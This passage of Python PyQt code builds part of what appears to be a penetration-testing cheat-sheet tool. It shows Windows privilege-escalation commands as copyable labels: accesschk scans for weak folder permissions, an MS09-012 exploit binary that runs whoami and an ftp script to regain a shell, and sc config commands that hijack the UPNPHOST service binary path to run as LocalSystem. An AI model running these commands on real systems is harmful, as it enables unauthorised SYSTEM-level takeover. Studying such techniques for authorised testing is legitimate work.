        # wpe_23_Scan4_Copy
        if hasattr(self, 'wpe_23_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan4_Copy)
            self.wpe_23_Scan4_Copy.deleteLater()
        self.wpe_23_Scan4_Copy = QPushButton()
        self.wpe_23_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_23_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_23_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_23_Scan4.text()))
        self.wpe_23_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_23_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_23_Scan4_Copy)
        label_layout.addWidget(self.wpe_23_Scan4)
        self.tab4_container_layout.insertLayout(370, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_divider1
        if hasattr(self, 'wpe_23_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider1)
            self.wpe_23_divider1.deleteLater()
        self.wpe_23_divider1 = QFrame()
        self.wpe_23_divider1.setFrameShape(QFrame.HLine)
        self.wpe_23_divider1.setLineWidth(3)
        self.wpe_23_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_23_divider2
        if hasattr(self, 'wpe_23_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider2)
            self.wpe_23_divider2.deleteLater()
        self.wpe_23_divider2 = QFrame()
        self.wpe_23_divider2.setFrameShape(QFrame.HLine)
        self.wpe_23_divider2.setLineWidth(3)
        self.wpe_23_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_23_spacer1
        if hasattr(self, 'wpe_23_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer1)
            self.wpe_23_spacer1.deleteLater()
        self.wpe_23_spacer1 = QLabel()
        self.wpe_23_spacer1.setFixedWidth(40)
        self.wpe_23_spacer1.setFixedHeight(50)
     
        # wpe_23_spacer2
        if hasattr(self, 'wpe_23_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer2)
            self.wpe_23_spacer2.deleteLater()
        self.wpe_23_spacer2 = QLabel()
        self.wpe_23_spacer2.setFixedWidth(40)
        self.wpe_23_spacer2.setFixedHeight(50)
     
        # wpe_23 spacer & divider layout
        self.tab4_container_layout.insertWidget(371, self.wpe_23_spacer1)
        self.tab4_container_layout.insertWidget(372, self.wpe_23_divider1)
        self.tab4_container_layout.insertWidget(373, self.wpe_23_divider2)
        self.tab4_container_layout.insertWidget(374, self.wpe_23_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_24
        if hasattr(self, 'wpe_24'):
            self.tab4_container_layout.removeWidget(self.wpe_24)
            self.wpe_24.deleteLater()
        self.wpe_24 = QLabel("[ + Find ALL weak folder permissions, per drive ]")
        self.wpe_24.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(375,self.wpe_24)
     
        # wpe_24_Scan1
        if hasattr(self, 'wpe_24_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan1)
            self.wpe_24_Scan1.deleteLater()
        self.wpe_24_Scan1 = QLabel("accesschk.exe -uwdqs Users c:\\")
        self.wpe_24_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(376,self.wpe_24_Scan1)
     
        # wpe_24_Scan1_Copy
        if hasattr(self, 'wpe_24_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan1_Copy)
            self.wpe_24_Scan1_Copy.deleteLater()
        self.wpe_24_Scan1_Copy = QPushButton()
        self.wpe_24_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_24_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_24_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_24_Scan1.text()))
        self.wpe_24_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_24_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_24_Scan1_Copy)
        label_layout.addWidget(self.wpe_24_Scan1)
        self.tab4_container_layout.insertLayout(377, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_divider1
        if hasattr(self, 'wpe_24_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider1)
            self.wpe_24_divider1.deleteLater()
        self.wpe_24_divider1 = QFrame()
        self.wpe_24_divider1.setFrameShape(QFrame.HLine)
        self.wpe_24_divider1.setLineWidth(3)
        self.wpe_24_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_24_divider2
        if hasattr(self, 'wpe_24_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider2)
            self.wpe_24_divider2.deleteLater()
        self.wpe_24_divider2 = QFrame()
        self.wpe_24_divider2.setFrameShape(QFrame.HLine)
        self.wpe_24_divider2.setLineWidth(3)
        self.wpe_24_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_24_spacer1
        if hasattr(self, 'wpe_24_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer1)
            self.wpe_24_spacer1.deleteLater()
        self.wpe_24_spacer1 = QLabel()
        self.wpe_24_spacer1.setFixedWidth(40)
        self.wpe_24_spacer1.setFixedHeight(50)
     
        # wpe_24_spacer2
        if hasattr(self, 'wpe_24_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer2)
            self.wpe_24_spacer2.deleteLater()
        self.wpe_24_spacer2 = QLabel()
        self.wpe_24_spacer2.setFixedWidth(40)
        self.wpe_24_spacer2.setFixedHeight(50)
     
        # wpe_24 spacer & divider layout
        self.tab4_container_layout.insertWidget(378, self.wpe_24_spacer1)
        self.tab4_container_layout.insertWidget(379, self.wpe_24_divider1)
        self.tab4_container_layout.insertWidget(380, self.wpe_24_divider2)
        self.tab4_container_layout.insertWidget(381, self.wpe_24_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_Scan2
        if hasattr(self, 'wpe_24_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan2)
            self.wpe_24_Scan2.deleteLater()
        self.wpe_24_Scan2 = QLabel("accesschk.exe -uwdqs \"Authenticated Users\" c:\\")
        self.wpe_24_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(382,self.wpe_24_Scan2)
     
        # wpe_24_Scan2_Copy
        if hasattr(self, 'wpe_24_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan2_Copy)
            self.wpe_24_Scan2_Copy.deleteLater()
        self.wpe_24_Scan2_Copy = QPushButton()
        self.wpe_24_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_24_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_24_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_24_Scan2.text()))
        self.wpe_24_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_24_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_24_Scan2_Copy)
        label_layout.addWidget(self.wpe_24_Scan2)
        self.tab4_container_layout.insertLayout(383, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_divider1
        if hasattr(self, 'wpe_24_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider1)
            self.wpe_24_divider1.deleteLater()
        self.wpe_24_divider1 = QFrame()
        self.wpe_24_divider1.setFrameShape(QFrame.HLine)
        self.wpe_24_divider1.setLineWidth(3)
        self.wpe_24_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_24_divider2
        if hasattr(self, 'wpe_24_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider2)
            self.wpe_24_divider2.deleteLater()
        self.wpe_24_divider2 = QFrame()
        self.wpe_24_divider2.setFrameShape(QFrame.HLine)
        self.wpe_24_divider2.setLineWidth(3)
        self.wpe_24_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_24_spacer1
        if hasattr(self, 'wpe_24_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer1)
            self.wpe_24_spacer1.deleteLater()
        self.wpe_24_spacer1 = QLabel()
        self.wpe_24_spacer1.setFixedWidth(40)
        self.wpe_24_spacer1.setFixedHeight(50)
     
        # wpe_24_spacer2
        if hasattr(self, 'wpe_24_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer2)
            self.wpe_24_spacer2.deleteLater()
        self.wpe_24_spacer2 = QLabel()
        self.wpe_24_spacer2.setFixedWidth(40)
        self.wpe_24_spacer2.setFixedHeight(50)
     
        # wpe_24 spacer & divider layout
        self.tab4_container_layout.insertWidget(384, self.wpe_24_spacer1)
        self.tab4_container_layout.insertWidget(385, self.wpe_24_divider1)
        self.tab4_container_layout.insertWidget(386, self.wpe_24_divider2)
        self.tab4_container_layout.insertWidget(387, self.wpe_24_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_Scan3
        if hasattr(self, 'wpe_24_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan3)
            self.wpe_24_Scan3.deleteLater()
        self.wpe_24_Scan3 = QLabel("accesschk.exe -uwqs Users c:*.*")
        self.wpe_24_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(388,self.wpe_24_Scan3)
     
        # wpe_24_Scan3_Copy
        if hasattr(self, 'wpe_24_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan3_Copy)
            self.wpe_24_Scan3_Copy.deleteLater()
        self.wpe_24_Scan3_Copy = QPushButton()
        self.wpe_24_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_24_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_24_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_24_Scan3.text()))
        self.wpe_24_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_24_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_24_Scan3_Copy)
        label_layout.addWidget(self.wpe_24_Scan3)
        self.tab4_container_layout.insertLayout(389, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_divider1
        if hasattr(self, 'wpe_24_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider1)
            self.wpe_24_divider1.deleteLater()
        self.wpe_24_divider1 = QFrame()
        self.wpe_24_divider1.setFrameShape(QFrame.HLine)
        self.wpe_24_divider1.setLineWidth(3)
        self.wpe_24_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_24_divider2
        if hasattr(self, 'wpe_24_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider2)
            self.wpe_24_divider2.deleteLater()
        self.wpe_24_divider2 = QFrame()
        self.wpe_24_divider2.setFrameShape(QFrame.HLine)
        self.wpe_24_divider2.setLineWidth(3)
        self.wpe_24_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_24_spacer1
        if hasattr(self, 'wpe_24_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer1)
            self.wpe_24_spacer1.deleteLater()
        self.wpe_24_spacer1 = QLabel()
        self.wpe_24_spacer1.setFixedWidth(40)
        self.wpe_24_spacer1.setFixedHeight(50)
     
        # wpe_24_spacer2
        if hasattr(self, 'wpe_24_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer2)
            self.wpe_24_spacer2.deleteLater()
        self.wpe_24_spacer2 = QLabel()
        self.wpe_24_spacer2.setFixedWidth(40)
        self.wpe_24_spacer2.setFixedHeight(50)
     
        # wpe_24 spacer & divider layout
        self.tab4_container_layout.insertWidget(390, self.wpe_24_spacer1)
        self.tab4_container_layout.insertWidget(391, self.wpe_24_divider1)
        self.tab4_container_layout.insertWidget(392, self.wpe_24_divider2)
        self.tab4_container_layout.insertWidget(393, self.wpe_24_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_Scan4
        if hasattr(self, 'wpe_24_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan4)
            self.wpe_24_Scan4.deleteLater()
        self.wpe_24_Scan4 = QLabel("accesschk.exe -uwqs \"Authenticated Users\" c:*.*")
        self.wpe_24_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(394,self.wpe_24_Scan4)
     
        # wpe_24_Scan4_Copy
        if hasattr(self, 'wpe_24_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_24_Scan4_Copy)
            self.wpe_24_Scan4_Copy.deleteLater()
        self.wpe_24_Scan4_Copy = QPushButton()
        self.wpe_24_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_24_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_24_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_24_Scan4.text()))
        self.wpe_24_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_24_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_24_Scan4_Copy)
        label_layout.addWidget(self.wpe_24_Scan4)
        self.tab4_container_layout.insertLayout(395, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_24_divider1
        if hasattr(self, 'wpe_24_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider1)
            self.wpe_24_divider1.deleteLater()
        self.wpe_24_divider1 = QFrame()
        self.wpe_24_divider1.setFrameShape(QFrame.HLine)
        self.wpe_24_divider1.setLineWidth(3)
        self.wpe_24_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_24_divider2
        if hasattr(self, 'wpe_24_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_divider2)
            self.wpe_24_divider2.deleteLater()
        self.wpe_24_divider2 = QFrame()
        self.wpe_24_divider2.setFrameShape(QFrame.HLine)
        self.wpe_24_divider2.setLineWidth(3)
        self.wpe_24_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_24_spacer1
        if hasattr(self, 'wpe_24_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer1)
            self.wpe_24_spacer1.deleteLater()
        self.wpe_24_spacer1 = QLabel()
        self.wpe_24_spacer1.setFixedWidth(40)
        self.wpe_24_spacer1.setFixedHeight(50)
     
        # wpe_24_spacer2
        if hasattr(self, 'wpe_24_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_24_spacer2)
            self.wpe_24_spacer2.deleteLater()
        self.wpe_24_spacer2 = QLabel()
        self.wpe_24_spacer2.setFixedWidth(40)
        self.wpe_24_spacer2.setFixedHeight(50)
     
        # wpe_24 spacer & divider layout
        self.tab4_container_layout.insertWidget(396, self.wpe_24_spacer1)
        self.tab4_container_layout.insertWidget(397, self.wpe_24_divider1)
        self.tab4_container_layout.insertWidget(398, self.wpe_24_divider2)
        self.tab4_container_layout.insertWidget(399, self.wpe_24_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_25
        if hasattr(self, 'wpe_25'):
            self.tab4_container_layout.removeWidget(self.wpe_25)
            self.wpe_25.deleteLater()
        self.wpe_25 = QLabel("[ + Are you NT AUTHORITY\\NETWORK SERVICE? ]")
        self.wpe_25.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(400,self.wpe_25)
     
        # wpe_25_Scan1
        if hasattr(self, 'wpe_25_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan1)
            self.wpe_25_Scan1.deleteLater()
        self.wpe_25_Scan1 = QLabel("MS09-012.exe \"whoami\"")
        self.wpe_25_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(401,self.wpe_25_Scan1)
     
        # wpe_25_Scan1_Copy
        if hasattr(self, 'wpe_25_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan1_Copy)
            self.wpe_25_Scan1_Copy.deleteLater()
        self.wpe_25_Scan1_Copy = QPushButton()
        self.wpe_25_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_25_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_25_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_25_Scan1.text()))
        self.wpe_25_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_25_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_25_Scan1_Copy)
        label_layout.addWidget(self.wpe_25_Scan1)
        self.tab4_container_layout.insertLayout(402, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_25_divider1
        if hasattr(self, 'wpe_25_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider1)
            self.wpe_25_divider1.deleteLater()
        self.wpe_25_divider1 = QFrame()
        self.wpe_25_divider1.setFrameShape(QFrame.HLine)
        self.wpe_25_divider1.setLineWidth(3)
        self.wpe_25_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_25_divider2
        if hasattr(self, 'wpe_25_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider2)
            self.wpe_25_divider2.deleteLater()
        self.wpe_25_divider2 = QFrame()
        self.wpe_25_divider2.setFrameShape(QFrame.HLine)
        self.wpe_25_divider2.setLineWidth(3)
        self.wpe_25_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_25_spacer1
        if hasattr(self, 'wpe_25_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer1)
            self.wpe_25_spacer1.deleteLater()
        self.wpe_25_spacer1 = QLabel()
        self.wpe_25_spacer1.setFixedWidth(40)
        self.wpe_25_spacer1.setFixedHeight(50)
     
        # wpe_25_spacer2
        if hasattr(self, 'wpe_25_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer2)
            self.wpe_25_spacer2.deleteLater()
        self.wpe_25_spacer2 = QLabel()
        self.wpe_25_spacer2.setFixedWidth(40)
        self.wpe_25_spacer2.setFixedHeight(50)
     
        # wpe_25 spacer & divider layout
        self.tab4_container_layout.insertWidget(403, self.wpe_25_spacer1)
        self.tab4_container_layout.insertWidget(404, self.wpe_25_divider1)
        self.tab4_container_layout.insertWidget(405, self.wpe_25_divider2)
        self.tab4_container_layout.insertWidget(406, self.wpe_25_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_25_Scan2
        if hasattr(self, 'wpe_25_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan2)
            self.wpe_25_Scan2.deleteLater()
        self.wpe_25_Scan2 = QLabel("Initiate Network-Related Transfer Again.")
        self.wpe_25_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(407,self.wpe_25_Scan2)
     
        # wpe_25_Scan2_Copy
        if hasattr(self, 'wpe_25_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan2_Copy)
            self.wpe_25_Scan2_Copy.deleteLater()
        self.wpe_25_Scan2_Copy = QPushButton()
        self.wpe_25_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_25_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_25_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_25_Scan2.text()))
        self.wpe_25_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_25_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_25_Scan2_Copy)
        label_layout.addWidget(self.wpe_25_Scan2)
        self.tab4_container_layout.insertLayout(408, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_25_divider1
        if hasattr(self, 'wpe_25_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider1)
            self.wpe_25_divider1.deleteLater()
        self.wpe_25_divider1 = QFrame()
        self.wpe_25_divider1.setFrameShape(QFrame.HLine)
        self.wpe_25_divider1.setLineWidth(3)
        self.wpe_25_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_25_divider2
        if hasattr(self, 'wpe_25_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider2)
            self.wpe_25_divider2.deleteLater()
        self.wpe_25_divider2 = QFrame()
        self.wpe_25_divider2.setFrameShape(QFrame.HLine)
        self.wpe_25_divider2.setLineWidth(3)
        self.wpe_25_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_25_spacer1
        if hasattr(self, 'wpe_25_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer1)
            self.wpe_25_spacer1.deleteLater()
        self.wpe_25_spacer1 = QLabel()
        self.wpe_25_spacer1.setFixedWidth(40)
        self.wpe_25_spacer1.setFixedHeight(50)
     
        # wpe_25_spacer2
        if hasattr(self, 'wpe_25_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer2)
            self.wpe_25_spacer2.deleteLater()
        self.wpe_25_spacer2 = QLabel()
        self.wpe_25_spacer2.setFixedWidth(40)
        self.wpe_25_spacer2.setFixedHeight(50)
     
        # wpe_25 spacer & divider layout
        self.tab4_container_layout.insertWidget(409, self.wpe_25_spacer1)
        self.tab4_container_layout.insertWidget(410, self.wpe_25_divider1)
        self.tab4_container_layout.insertWidget(411, self.wpe_25_divider2)
        self.tab4_container_layout.insertWidget(412, self.wpe_25_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_25_Scan3
        if hasattr(self, 'wpe_25_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan3)
            self.wpe_25_Scan3.deleteLater()
        self.wpe_25_Scan3 = QLabel("MS09-012.exe \"ftp -v -n -s:ftp.txt\" and come back in NT Shell.")
        self.wpe_25_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(413,self.wpe_25_Scan3)
     
        # wpe_25_Scan3_Copy
        if hasattr(self, 'wpe_25_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_25_Scan3_Copy)
            self.wpe_25_Scan3_Copy.deleteLater()
        self.wpe_25_Scan3_Copy = QPushButton()
        self.wpe_25_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_25_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_25_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_25_Scan3.text()))
        self.wpe_25_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_25_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_25_Scan3_Copy)
        label_layout.addWidget(self.wpe_25_Scan3)
        self.tab4_container_layout.insertLayout(414, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_25_divider1
        if hasattr(self, 'wpe_25_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider1)
            self.wpe_25_divider1.deleteLater()
        self.wpe_25_divider1 = QFrame()
        self.wpe_25_divider1.setFrameShape(QFrame.HLine)
        self.wpe_25_divider1.setLineWidth(3)
        self.wpe_25_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_25_divider2
        if hasattr(self, 'wpe_25_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_divider2)
            self.wpe_25_divider2.deleteLater()
        self.wpe_25_divider2 = QFrame()
        self.wpe_25_divider2.setFrameShape(QFrame.HLine)
        self.wpe_25_divider2.setLineWidth(3)
        self.wpe_25_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_25_spacer1
        if hasattr(self, 'wpe_25_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer1)
            self.wpe_25_spacer1.deleteLater()
        self.wpe_25_spacer1 = QLabel()
        self.wpe_25_spacer1.setFixedWidth(40)
        self.wpe_25_spacer1.setFixedHeight(50)
     
        # wpe_25_spacer2
        if hasattr(self, 'wpe_25_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_25_spacer2)
            self.wpe_25_spacer2.deleteLater()
        self.wpe_25_spacer2 = QLabel()
        self.wpe_25_spacer2.setFixedWidth(40)
        self.wpe_25_spacer2.setFixedHeight(50)
     
        # wpe_25 spacer & divider layout
        self.tab4_container_layout.insertWidget(415, self.wpe_25_spacer1)
        self.tab4_container_layout.insertWidget(416, self.wpe_25_divider1)
        self.tab4_container_layout.insertWidget(417, self.wpe_25_divider2)
        self.tab4_container_layout.insertWidget(418, self.wpe_25_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_26
        if hasattr(self, 'wpe_26'):
            self.tab4_container_layout.removeWidget(self.wpe_26)
            self.wpe_26.deleteLater()
        self.wpe_26 = QLabel("[ + Exploit weak service path ]")
        self.wpe_26.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(419,self.wpe_26)
     
        # wpe_26_Scan1
        if hasattr(self, 'wpe_26_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan1)
            self.wpe_26_Scan1.deleteLater()
        self.wpe_26_Scan1 = QLabel("sc config UPNPHOST binpath= \"C:\\Tools\dmin1Maint.exe\"")
        self.wpe_26_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(420,self.wpe_26_Scan1)
     
        # wpe_26_Scan1_Copy
        if hasattr(self, 'wpe_26_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan1_Copy)
            self.wpe_26_Scan1_Copy.deleteLater()
        self.wpe_26_Scan1_Copy = QPushButton()
        self.wpe_26_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan1.text()))
        self.wpe_26_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan1_Copy)
        label_layout.addWidget(self.wpe_26_Scan1)
        self.tab4_container_layout.insertLayout(421, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(422, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(423, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(424, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(425, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan2
        if hasattr(self, 'wpe_26_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan2)
            self.wpe_26_Scan2.deleteLater()
        self.wpe_26_Scan2 = QLabel("sc config UPNPHOST obj= \".\\LocalSystem\" password= \"\"")
        self.wpe_26_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(426,self.wpe_26_Scan2)
     
        # wpe_26_Scan2_Copy
        if hasattr(self, 'wpe_26_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan2_Copy)
            self.wpe_26_Scan2_Copy.deleteLater()
        self.wpe_26_Scan2_Copy = QPushButton()
        self.wpe_26_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan2.text()))
